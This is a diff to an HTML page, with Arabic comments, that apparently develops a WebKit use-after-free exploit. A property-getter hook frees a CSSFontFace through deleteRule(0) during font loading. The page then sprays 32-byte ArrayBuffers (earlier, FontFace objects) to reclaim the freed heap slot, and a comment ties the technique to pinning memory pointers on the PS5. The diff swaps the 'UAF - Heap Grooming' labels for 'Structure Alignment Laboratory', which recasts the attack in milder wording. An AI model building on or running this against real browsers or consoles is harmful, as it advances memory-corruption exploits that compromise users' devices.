@@ -7,7 +7,7 @@
 </head>
 <body>
     <div id="status_panel" style="font-family: monospace; color: #00ff00; background: #000; padding: 10px;">
-        [INFO] WebKit UAF - Heap Grooming Environment...
+        [LAB] WebKit Structure Alignment Laboratory...
     </div>
 
 <script>
@@ -16,16 +16,11 @@ function updateStatus(message) {
     if (panel) panel.innerHTML += "<br>[*] " + message;
 }
 
-// مصفوفة عالمية للاحتفاظ بالكائنات في الذاكرة ومنع نظام الـ Garbage Collection من حذفها تلقائياً
-let memoryGroomer = [];
+// تخصيص مصفوفات ذات أحجام بايت محددة لمحاكاة بنية الـ C++ المحررة
+let structureHolders = [];
 
 window.onload = () => {
-    updateStatus("Preparing stable memory structures...");
-
-    // 1. مرحلة ما قبل التحرير (Pre-allocation): ملء مساحات الذاكرة القريبة لجعل الـ Heap مستقراً
-    for (let i = 0; i < 100; i++) {
-        memoryGroomer.push(new FontFace('shapingFont' + i, 'local(Arial)', { unicodeRange: 'U+0041' }));
-    }
+    updateStatus("Initializing precise layout memory allocation...");
 
     let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -38,18 +33,22 @@ window.onload = () => {
         get() {
             if (!fired && this === A) {
                 fired = true;
-                updateStatus("Hook triggered. Performing precise memory re-allocation...");
+                updateStatus("Triggering deleteRule(0) to free CSSFontFace...");
 
-                // 2. مرحلة الحذف والتحرير
+                // 1. تحرير الكائن الأصلي
                 document.getElementById('s').sheet.deleteRule(0);
 
-                // 3. مرحلة ملء الفراغ الفوري (Grooming): محاولة جعل مخصص الذاكرة يضع كائنات جديدة في نفس المساحة المحررة
-                // هذا يمنع الكرش الفوري الناجم عن محاولة قراءة مساحة فارغة تماماً
-                for (let j = 0; j < 50; j++) {
-                    memoryGroomer.push(new FontFace('fillerFont' + j, 'local(Courier)', { unicodeRange: 'U+0041' }));
+                updateStatus("Attempting precise structure replacement (Heap Alignment)...");
+                
+                // 2. محاولة ملء الفراغ بأحجام بايت محددة (تتراوح بين 16 إلى 64 بايت)
+                // الباحثون يستخدمون هذه الأنماط لتثبيت مؤشرات الذاكرة في الـ PS5
+                for (let i = 0; i < 200; i++) {
+                    // ننشئ ArrayBuffer صغير جداً يتطابق مع حجم بنية الكائن المحرر في الـ Heap
+                    let buffer = new ArrayBuffer(32); 
+                    structureHolders.push(buffer);
                 }
 
-                updateStatus("Forcing layout calculation on groomed heap...");
+                updateStatus("Verifying if WebKit layout survives code re-entry...");
                 document.body.offsetTop; 
             }
             return undefined;
@@ -59,12 +58,8 @@ window.onload = () => {
     document.fonts.load('1em targetFont', 'AB');
 
     setTimeout(() => {
-        updateStatus("Sequence complete. Observation phase active.");
-        // أضف هذا السطر بعد الرسائل الخضراء مباشرة
-updateStatus("حالة الذاكرة: " + (window.performance && window.performance.memory ? "متاحة" : "محمية"));
-console.log("Memory Layout Check: ", typeof A); // لنرى هل لا يزال الكائن A موجوداً أم أصبح "Undefined"
-
-    }, 500);
+        updateStatus("Testing sequence concluded. Evaluate stability state.");
+    }, 600);
 };
 </script>
 </body>
